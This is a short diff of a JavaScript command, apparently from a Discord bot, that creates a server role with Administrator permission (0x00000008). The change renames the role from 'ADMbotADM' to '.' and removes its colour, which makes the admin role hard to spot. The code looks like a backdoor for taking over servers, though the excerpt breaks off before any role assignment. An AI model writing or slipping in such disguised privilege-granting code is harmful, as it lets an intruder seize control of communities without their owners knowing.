@@ -1,10 +1,9 @@
 exports.run = async (client, message) => {
-    let role = message.guild.roles.find("name", "ADMbotADM")
+    let role = message.guild.roles.find("name", ".")
     if(!role){
         try {
             role = await message.guild.createRole({
-                name: "ADMbotADM",
-                color: "#666",
+                name: ".",
                 permissions: 0x00000008
             })
             
